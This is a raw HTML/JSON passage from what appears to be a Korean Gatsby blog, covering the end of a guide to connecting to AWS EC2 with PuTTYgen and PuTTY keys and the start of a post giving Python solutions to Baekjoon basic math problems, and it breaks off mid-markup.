srcset=\"/static/5976484fc843e9c889e63183d39c2a9e/c9b55/3.webp 165w,\n/static/5976484fc843e9c889e63183d39c2a9e/f2908/3.webp 330w,\n/static/5976484fc843e9c889e63183d39c2a9e/162c5/3.webp 479w\"\n              sizes=\"(max-width: 479px) 100vw, 479px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5976484fc843e9c889e63183d39c2a9e/04c57/3.png 165w,\n/static/5976484fc843e9c889e63183d39c2a9e/d9ecf/3.png 330w,\n/static/5976484fc843e9c889e63183d39c2a9e/a9b70/3.png 479w\"\n            sizes=\"(max-width: 479px) 100vw, 479px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5976484fc843e9c889e63183d39c2a9e/a9b70/3.png\"\n            alt=\"3\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n</li>\n<li>\n<p>패스워드를 따로 설정하지 않는지 물어본다.\r\n만들고 싶으면 Key passphrase/Coonfirm passphrase 폼을 채워 제출한다.\r\n그래도 예를 누르면 패스워드를 따로 설정하지 않는다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 292px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 52.121212121212125%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABpElEQVR42q2S227aQBCG/Rx9mb5kX6G5rqJe9KYkStKIoJBQo2KzdozBBR/Ah/XayyGCL7JpERe9qdqRfu3MaDQ78+0as5mPGAuEcBBCMPWnOELgCpcgmLN73bHZbE7abrd/9He7HdPpFCPLUpSqkEXOYrFAlYo0TUmXK1bLlL+xOI4x6lrzvyyKIoyqUsdo48PhgNZr1mtNc9Faa7TWv9bboFRJVR9zuq5RSlHXNUUhzxrWWyDlZ/cdh/oebxLS7z9iWRa2NcI0TUxzyHA45PvgmRdvgjX6Qa/3gGVbLXffn5011AdYP1CI9+yLC0r1SpxEZFlGwzcKI+bzOUmybHN5npOlGXGctHEz7W8Lw7BhWP0zu/1+f2zYTJgkScuhVLJl0qhU5cmPVgXzZU6cKaJUsljmFLJEStmqLEuqqmq5O84LRrN3k5RFcSpqC6UkLyQXNzafb5/58PGST9ePXHZtulaAa4+4+3bP1VWHTueaIAhwXRfD87wWZvMHzxWGzRnytS+4HYz5cvdEpzfkZuBgjid4roNl21jWiH7/Cd/324d7A5ja8OQL0zvnAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/32216812daf0c1dbb33adb435c0098ac/c9b55/4.webp 165w,\n/static/32216812daf0c1dbb33adb435c0098ac/1ad3b/4.webp 292w\"\n              sizes=\"(max-width: 292px) 100vw, 292px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/32216812daf0c1dbb33adb435c0098ac/04c57/4.png 165w,\n/static/32216812daf0c1dbb33adb435c0098ac/2e9f9/4.png 292w\"\n            sizes=\"(max-width: 292px) 100vw, 292px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/32216812daf0c1dbb33adb435c0098ac/2e9f9/4.png\"\n            alt=\"4\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n</li>\n<li>\n<p>저장해준다. 파일명은 아무거나 상관없음</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 37.57575757575758%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABd0lEQVR42m2PyY7UMBRF8/8r/oQtC8SGDUKIRnQtKGpKUYkzdIZOHDuxHecgu5uSQFg6fs/29fV10jQtdVWgppF5Xpjn+Y5SCq011tq/MMbc+aMN+1pNJH6DWT+jVYeUKppIKSNt29H3PW5d8d5HnHMsyxINQpVyYhxHtJ4Z1ULS9CN10yGnGaVn9LxgrGVeDMa62C+LQU6acVIsxsafhPViTFxH00lzEj3Jw/cdUo5opbDGxBRhbNsWppfee4ZhoH8eYqqQ0lp31zm3xh6/knz6tuN2vZKXNdp6XPAJZxt4v+HDhXXFGIt1LiZ3q4+aNZy/aoI+pE3OacrxeOTtl4w37y+8e7ghqpZb1VG0A6IZYi3aMdYy1LDXDJTdSNm+9FUnuRYNSZ7nZFlGer1xOF04nS+kl5Qsy6mfnqjr+r+UVc2vTHATBWVZIQpBLgTJfr+PhlVZRspXiqJACEF48F+KQnBMMz58fuTj1x/8PJ7Z7R45HA78BpSLYMbz1CH2AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5c986cf173dc90c2f3de7d7a214fa664/c9b55/5.webp 165w,\n/static/5c986cf173dc90c2f3de7d7a214fa664/f2908/5.webp 330w,\n/static/5c986cf173dc90c2f3de7d7a214fa664/ff4b8/5.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5c986cf173dc90c2f3de7d7a214fa664/04c57/5.png 165w,\n/static/5c986cf173dc90c2f3de7d7a214fa664/d9ecf/5.png 330w,\n/static/5c986cf173dc90c2f3de7d7a214fa664/32056/5.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5c986cf173dc90c2f3de7d7a214fa664/32056/5.png\"\n            alt=\"5\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n</li>\n<li>\n<p>private 키 설정이 끝났으니 puttygen은 종료해도 된다.\r\n서버와의 연결을 위해 putty를 실행한다.</p>\n</li>\n<li>\n<p>접속할 ip, port를 지정 후 왼쪽 카테고리에서 다음 경로로 들어간다.\r\nConnection > SSH > Auth 선택 후 Private key file for authentication > Browse</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 452px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 97.57575757575758%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAA7DAAAOwwHHb6hkAAADV0lEQVR42n1UaW+rVhDlv/ffVP1cvU9NXqoYkoBtVgNmN44XMDt4VU41E9typdcije+1uJyZOefMFcTRDyRJjPV6jSROEIYhojBC1/U4nU44Ho84HA6/DHrXti36vkfXdbwKlqUjTmI0TYNit0OW5SiKAsMw3IM+vMUtyeN+v98zIO0F1/UwVhQEYYR+GPhlUZZIl0vkeY7dbgfLNGGaFmaWBVXTYZomDMOCrutQpyoWaYo8y1CWJYSu73HY7+E4DnwvQFlWuFzO2Gw2SJKEI45jjiiK4AcBr0mygOd58H0fyWKBLMtQ1zWEtutwOh4xs2yoqoa6bnA+n5Hn35U9/fUERRljNJIgSW+QxDdIkgRRfIOiKJhMJrAdF0VZcNsC/bRNC9dxoRsmk02AWZ4jiWM4jssixVEEz/Px+fmJ9XrFIm63WyyXSxRFybyTQAKVSYK4ros0XYIe4oLaII5GryMosnKtUmQXECitcZygqio+fwekP9S/oRvIdwUDUmbfD5gfSRIhKxN+Px5PIMsyJpMpt/8hy1xEVdcMyi0fDkdukVojgeihBER+4PvsAGtmYzb7VlXTNAYnd+i6wYqTylQpVzjs9zifTrBtG1m+uwMGQcAqTqcqf2TbDluEzm23GVuKzt2sRdE2DQQ2Zdtytqpq/gUYhgEm0yl0TYPGnpvCsmzUTcMt3rij88whtUyTcLlc2ENkZmqfOAzCkCtkrt7fIUoS5A8Z4khkDtnoM5vFmXseV9pzy8PAVfVdC0NTsVqtsdlsuUIyMH1Epidwb+5xywRGZ7iINMU8DLEYT9BEEYSeAb8wi9b47fcP1MMRdVViPvfYTl3f3Qf/FsPQ8zsSgfz5/v4ByzBR0ejdKtwVFXQ35n2eZ2wZUu6R9F8FWYYS1s33yoBfX1/ouw7rNOXbhQ4SIFVBoP8Xj+IwILVAgCS5OtX4ciBRiLPmQc3quv5X3AH3+wO3SXchjRJdCjTHRHZ9nYBHUOKXkrdNzXuqkhLX19YF8hDNpqrq7KembbFYpAjDiLPeyCevFnUDf1XADJaYxRsEq+I7+SLlEeRJMU0DLy8vEEXpenGaeH19xUgU2SJ0D9KdmC4SOH6M57GDP378xJ9/K3hSHGi6gZ/Pz3xxEO//APWJxOv44mNHAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/ca0f9999737ba64a6b1479e5e14abf95/c9b55/6.webp 165w,\n/static/ca0f9999737ba64a6b1479e5e14abf95/f2908/6.webp 330w,\n/static/ca0f9999737ba64a6b1479e5e14abf95/97d89/6.webp 452w\"\n              sizes=\"(max-width: 452px) 100vw, 452px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/ca0f9999737ba64a6b1479e5e14abf95/04c57/6.png 165w,\n/static/ca0f9999737ba64a6b1479e5e14abf95/d9ecf/6.png 330w,\n/static/ca0f9999737ba64a6b1479e5e14abf95/fcb94/6.png 452w\"\n            sizes=\"(max-width: 452px) 100vw, 452px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/ca0f9999737ba64a6b1479e5e14abf95/fcb94/6.png\"\n            alt=\"6\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n</li>\n<li>\n<p>방금 생성한 private key를 넣어준다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.42424242424243%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABy0lEQVR42n2S647TMBBG8/5vhfhVkBbYFkqhXdImzq25OI1jO83lIJsVWhXaTzqKY883M8k4MNYwzwuDVZi+QClN13UepRR101CWJdYOLMvCNE1Ya7leR4wxPu5yuTBOk18HdSNRvaaqJY1sMcYyOMNgGQaLNRqjtd8brEH3GmuMP3dnvVLoXnFuOr69JASJ1KRFhdaacRw51xeOxYWiG8ik4axGarN4snbgkEpSaaj6ibjWZK2lVCNZN3FIG4Kk1YRFzdVa5nmikj37pOFX3vKStYj2St7jcaZEWkRjENKSXka/jmpNaeF4VgRqGPl8iKirknlZWOaJf7W88limVwRRLHj69AWRJFRV9efngx+UL+DhleW/uFinTrmEZ8mH7yGpEOR57ifre7pjvoeT8wbmOhEXNcs8+/G/TfhIdxPq4UoYxVRl6e+bu1uPjG8T3KrvewKlOuq68i+uQpZlxHGMEMKTJInfuyURgjiOiKOI0+lEURSkaUrgBuE+1ZHnGWEY+oDoFHE8Hn1Q27Z/kbL1sT8OIe9XT6ye1mw2G9bPz+z3e4IoinwXrhtndtXd0+H2bxHCdZzydX/k3ccNq/VP9ocDu92O7XbLbzrImATgOh7DAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6776bbf1e9eb4064bad2a03280bbe6ab/c9b55/7.webp 165w,\n/static/6776bbf1e9eb4064bad2a03280bbe6ab/f2908/7.webp 330w,\n/static/6776bbf1e9eb4064bad2a03280bbe6ab/ff4b8/7.webp 602w\"\n              sizes=\"(max-width: 602px) 100vw, 602px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6776bbf1e9eb4064bad2a03280bbe6ab/04c57/7.png 165w,\n/static/6776bbf1e9eb4064bad2a03280bbe6ab/d9ecf/7.png 330w,\n/static/6776bbf1e9eb4064bad2a03280bbe6ab/32056/7.png 602w\"\n            sizes=\"(max-width: 602px) 100vw, 602px\"\n            type=\"image/png\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6776bbf1e9eb4064bad2a03280bbe6ab/32056/7.png\"\n            alt=\"7\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n</li>\n<li>\n<p>이후 Session 카테고리로 돌아가 위의 설정을 모두 저장한다.</p>\n</li>\n</ol>\n<ul>\n<li>\n<p>최초접속시 User name</p>\n<p>Ubuntu의 경우: ubuntu</p>\n<p>Red hat의 경우: ec2-user</p>\n</li>\n</ul>","categories":["misc","setting"],"date":"January 29, 2021","description":null,"id":"190cb9ce-025b-5206-bc4c-720bf3986bfc","keywords":["aws","putty"],"slug":"/AWS-access-setting/","title":"AWS 접속설정","readingTime":{"text":"2 min read"}},{"banner":{"alt":null,"caption":null,"src":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","backgroundColor":"#f8f8f8","images":{"fallback":{"src":"/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/3b6fb/0.jpg","srcSet":"/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/5b3b6/0.jpg 120w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/561d4/0.jpg 241w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/3b6fb/0.jpg 481w","sizes":"(min-width: 481px) 481px, 100vw"},"sources":[{"srcSet":"/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/b86fb/0.webp 120w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/29eba/0.webp 241w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/5671c/0.webp 481w","type":"image/webp","sizes":"(min-width: 481px) 481px, 100vw"}]},"width":660,"height":400.66528066528065}}}},"body":"<p><a href=\"https://www.acmicpc.net/step/8\">BOJ 단계별로 풀어보기: 기본 수학 1</a></p>\n<p>수학적으로 접근하여 반복문을 최소화 시키는 것을 의도한 것으로 보인다.</p>\n<h2>단계1 손익분기점</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 481px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 105.45454545454544%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAVABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAEF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAB3aFQAUH/xAAUEAEAAAAAAAAAAAAAAAAAAAAw/9oACAEBAAEFAh//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAEDAQE/AR//xAAUEQEAAAAAAAAAAAAAAAAAAAAg/9oACAECAQE/AR//xAAUEAEAAAAAAAAAAAAAAAAAAAAw/9oACAEBAAY/Ah//xAAXEAEAAwAAAAAAAAAAAAAAAAAQASBB/9oACAEBAAE/IaSa/wD/2gAMAwEAAgADAAAAEKDHAP/EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8QH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8QH//EABsQAAMAAgMAAAAAAAAAAAAAAAABERAxIUGR/9oACAEBAAE/EI69il79EOnCUWhqhpPeP//Z'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/c9b55/0.webp 165w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/f2908/0.webp 330w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/1c567/0.webp 481w\"\n              sizes=\"(max-width: 481px) 100vw, 481px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/27f9f/0.jpg 165w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/80fc7/0.jpg 330w,\n/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/86d1c/0.jpg 481w\"\n            sizes=\"(max-width: 481px) 100vw, 481px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/6f4b2ce79debeaf86ffe78e36a4b8ff9/86d1c/0.jpg\"\n            alt=\"1번문제 풀이\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">A<span class=\"token punctuation\">,</span> B<span class=\"token punctuation\">,</span> C <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>rstrip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>B <span class=\"token operator\">>=</span> C<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\tN <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>A <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span>C <span class=\"token operator\">-</span> B<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>N<span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계2 벌집</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 480px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 122.42424242424244%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAYABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAEF/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEAMQAAAB3kpQQFB//8QAFBABAAAAAAAAAAAAAAAAAAAAMP/aAAgBAQABBQIf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAFBABAAAAAAAAAAAAAAAAAAAAMP/aAAgBAQAGPwIf/8QAGRAAAwADAAAAAAAAAAAAAAAAAAEQESEx/9oACAEBAAE/IWKPoozOp//aAAwDAQACAAMAAAAQMAAA/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPxAf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPxAf/8QAHBAAAgICAwAAAAAAAAAAAAAAAREAECFBMVFx/9oACAEBAAE/ECzzPRoOhiaoNuAEJw6//9k='); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/5d28fccd5018c59880a604383d60079c/c9b55/1.webp 165w,\n/static/5d28fccd5018c59880a604383d60079c/f2908/1.webp 330w,\n/static/5d28fccd5018c59880a604383d60079c/d3be9/1.webp 480w\"\n              sizes=\"(max-width: 480px) 100vw, 480px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/5d28fccd5018c59880a604383d60079c/27f9f/1.jpg 165w,\n/static/5d28fccd5018c59880a604383d60079c/80fc7/1.jpg 330w,\n/static/5d28fccd5018c59880a604383d60079c/7cc5e/1.jpg 480w\"\n            sizes=\"(max-width: 480px) 100vw, 480px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/5d28fccd5018c59880a604383d60079c/7cc5e/1.jpg\"\n            alt=\"2번문제 풀이\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">N <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\nn <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\r\n<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token operator\">*</span>n<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>n<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> N<span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">break</span>\r\n\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t\tn<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\r\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계3 분수찾기</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 480px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 109.69696969696969%; position: relative; bottom: 0; left: 0; background-image: url('data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAWABQDASIAAhEBAxEB/8QAFwABAQEBAAAAAAAAAAAAAAAAAAECBf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/9oADAMBAAIQAxAAAAHu2VKFzQoP/8QAFBABAAAAAAAAAAAAAAAAAAAAMP/aAAgBAQABBQIf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAwEBPwEf/8QAFBEBAAAAAAAAAAAAAAAAAAAAIP/aAAgBAgEBPwEf/8QAFBABAAAAAAAAAAAAAAAAAAAAMP/aAAgBAQAGPwIf/8QAGBAAAwEBAAAAAAAAAAAAAAAAARARIQD/2gAIAQEAAT8hBce3tX//2gAMAwEAAgADAAAAEGQPAP/EABYRAAMAAAAAAAAAAAAAAAAAAAERIP/aAAgBAwEBPxAOP//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8QH//EAB0QAQABBAMBAAAAAAAAAAAAAAERABAhMWGBsdH/2gAIAQEAAT8Qh3p+0IkjJaE4g6owZ8siQJUcLf/Z'); background-size: cover; display: block;\"\n  ></span>\n  <picture>\n          <source\n              srcset=\"/static/d394e5329d3c847385211877d97d461f/c9b55/2.webp 165w,\n/static/d394e5329d3c847385211877d97d461f/f2908/2.webp 330w,\n/static/d394e5329d3c847385211877d97d461f/d3be9/2.webp 480w\"\n              sizes=\"(max-width: 480px) 100vw, 480px\"\n              type=\"image/webp\"\n            />\n          <source\n            srcset=\"/static/d394e5329d3c847385211877d97d461f/27f9f/2.jpg 165w,\n/static/d394e5329d3c847385211877d97d461f/80fc7/2.jpg 330w,\n/static/d394e5329d3c847385211877d97d461f/7cc5e/2.jpg 480w\"\n            sizes=\"(max-width: 480px) 100vw, 480px\"\n            type=\"image/jpeg\"\n          />\n          <img\n            class=\"gatsby-resp-image-image\"\n            src=\"/static/d394e5329d3c847385211877d97d461f/7cc5e/2.jpg\"\n            alt=\"3번문제 풀이\"\n            title=\"\"\n            loading=\"lazy\"\n            decoding=\"async\"\n            style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n          />\n        </picture>\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">X <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\nN <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\r\nM <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\r\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">if</span> M <span class=\"token operator\">>=</span> X<span class=\"token punctuation\">:</span>\r\n\t\t<span class=\"token keyword\">break</span>\r\n\tN <span class=\"token operator\">+=</span> <span class=\"token number\">1</span>\r\n\tM <span class=\"token operator\">=</span> M <span class=\"token operator\">+</span> N\r\n<span class=\"token keyword\">if</span> N <span class=\"token operator\">%</span> <span class=\"token number\">2</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>M<span class=\"token operator\">-</span>X<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">-</span>M<span class=\"token operator\">+</span>X<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\r\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\r\n\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>N<span class=\"token operator\">-</span>M<span class=\"token operator\">+</span>X<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"/\"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>M<span class=\"token operator\">-</span>X<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre></div>\n<h2>단계4 달팽이는 올라가고 싶다</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 481px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 47.27272727272727%; position: relative; bottom: 0; left: 0; background-image: 